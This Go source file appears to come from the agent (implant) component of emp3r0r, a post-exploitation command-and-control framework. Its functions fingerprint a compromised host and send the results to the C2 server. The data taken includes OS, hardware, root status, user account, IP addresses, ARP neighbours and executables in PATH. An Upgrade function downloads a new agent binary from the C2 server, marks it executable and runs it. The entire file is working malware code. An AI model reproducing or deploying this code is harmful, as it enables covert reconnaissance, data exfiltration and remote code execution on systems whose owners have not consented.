package agent

import (
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"os/exec"
	"os/user"
	"runtime"
	"strings"

	"github.com/jaypipes/ghw"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/internal/transport"
	"github.com/jm33-m0/emp3r0r/core/lib/crypto"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

// is the agent alive?
// connect to emp3r0r_def.SocketName, send a message, see if we get a reply
func IsAgentAlive(c net.Conn) bool {
	log.Println("Testing if agent is alive...")
	defer c.Close()
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	replyFromAgent := make(chan string, 1)
	reader := func(r io.Reader) {
		buf := make([]byte, 1024)
		for ctx.Err() == nil {
			n, err := r.Read(buf[:])
			if err != nil {
				log.Printf("Read error: %v", err)
				cancel()
			}
			replyFromAgent <- string(buf[0:n])
		}
	}

	// listen for reply from agent
	go reader(c)

	// send hello to agent
	for ctx.Err() == nil {
		_, err := fmt.Fprintf(c, "%d", os.Getpid())
		if err != nil {
			log.Printf("Write error: %v, agent is likely to be dead", err)
			break
		}
		resp := <-replyFromAgent
		if strings.Contains(resp, "kill yourself") {
			log.Printf("Agent told me to die (%d)", os.Getpid())
			os.Exit(0)
		}
		if strings.Contains(resp, "emp3r0r") {
			log.Println("Yes it's alive")
			return true
		}
		util.TakeASnap()
	}

	return false
}

// Send2CC send TunData to CC
func Send2CC(data *def.MsgTunData) error {
	out := json.NewEncoder(def.CCMsgConn)

	err := out.Encode(data)
	if err != nil {
		return errors.New("Send2CC: " + err.Error())
	}
	return nil
}

// CollectSystemInfo build system info object
func CollectSystemInfo() *def.Emp3r0rAgent {
	log.Println("Collecting system info for checking in")
	var info def.Emp3r0rAgent
	osinfo := GetOSInfo()
	info.GOOS = runtime.GOOS

	info.OS = fmt.Sprintf("%s %s %s (%s)", osinfo.Vendor, osinfo.Name, osinfo.Version, osinfo.Architecture)
	hostname, err := os.Hostname()
	if err != nil {
		log.Printf("Gethostname: %v", err)
		hostname = "unknown_host"
	}
	// read productInfo
	info.Product, err = ghw.Product(ghw.WithDisableWarnings())
	if err != nil {
		log.Printf("ProductInfo: %v", err)
	}
	info.CWD, err = os.Getwd()
	if err != nil {
		log.Printf("Getwd: %v", err)
		info.CWD = "."
	}

	RuntimeConfig.AgentTag = util.GetHostID(info.Product, RuntimeConfig.AgentUUID)
	info.Tag = RuntimeConfig.AgentTag // use hostid
	info.Hostname = hostname
	info.Name = strings.Split(info.Tag, "-agent")[0]
	info.Version = def.Version
	info.Kernel = osinfo.Kernel
	info.Arch = osinfo.Architecture
	info.CPU = util.GetCPUInfo()
	info.GPU = util.GetGPUInfo()
	info.Mem = fmt.Sprintf("%d MB", util.GetMemSize())
	info.Hardware = util.CheckProduct(info.Product)
	info.Container = CheckContainer()
	setC2Transport()
	info.Transport = def.Transport

	// have root?
	info.HasRoot = HasRoot()

	// process
	info.Process = CheckAgentProcess()

	// user account info
	u, err := user.Current()
	if err != nil {
		log.Println(err)
		info.User = "Not available"
	}
	info.User = fmt.Sprintf("%s (%s), uid=%s, gid=%s", u.Username, u.HomeDir, u.Uid, u.Gid)

	// is cc on tor?
	info.HasTor = transport.IsTor(def.CCAddress)

	// has internet?
	if RuntimeConfig.EnableNCSI {
		info.HasInternet = transport.TestConnectivity(transport.UbuntuConnectivityURL, RuntimeConfig.C2TransportProxy)
		info.NCSIEnabled = true
	} else {
		info.HasInternet = false
		info.NCSIEnabled = false
	}

	// IP address?
	info.IPs = transport.IPa()

	// arp -a ?
	info.ARP = transport.IPNeigh()

	// exes in PATH
	info.Exes = util.ScanPATH()

	return &info
}

// Upgrade agent from https://ccAddress/agent
func Upgrade(checksum string) (out string) {
	tempfile := RuntimeConfig.AgentRoot + "/" + util.RandStr(util.RandInt(5, 15))
	_, err := SmartDownload("", "agent", tempfile, checksum)
	if err != nil {
		return fmt.Sprintf("Error: Download agent: %v", err)
	}
	download_checksum := crypto.SHA256SumFile(tempfile)
	if checksum != download_checksum {
		return fmt.Sprintf("Error: checksum mismatch: %s expected, got %s", checksum, download_checksum)
	}
	err = os.Chmod(tempfile, 0o755)
	if err != nil {
		return fmt.Sprintf("Error: chmod %s: %v", tempfile, err)
	}
	cmd := exec.Command(tempfile)
	cmd.Env = append(os.Environ(), "REPLACE_AGENT=true")
	err = cmd.Start()
	if err != nil {
		return fmt.Sprintf("Error: %v", err)
	}

	return fmt.Sprintf("Agent started with PID %d", cmd.Process.Pid)
}
